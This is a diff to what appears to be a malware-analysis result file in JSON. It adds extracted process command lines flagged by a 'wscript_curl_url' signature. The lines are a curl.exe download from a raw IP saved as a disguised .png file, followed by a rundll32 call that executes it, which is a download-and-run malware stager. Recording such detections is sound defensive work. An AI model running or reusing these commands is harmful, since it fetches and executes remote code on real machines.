@@ -249,6 +249,14 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.dat",
+                "rundll32 C:\\ProgramData\\index1.png,Wind "
+              ]
+            }
+          },
           "network": {
             "dynamic": {
               "ip": [
@@ -380,6 +388,22 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.dat"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_curl_url"
+          ],
+          "value": "rundll32 C:\\ProgramData\\index1.png,Wind "
+        }
+      ],
       "file.string.extracted": [
         {
           "heur_id": 2,
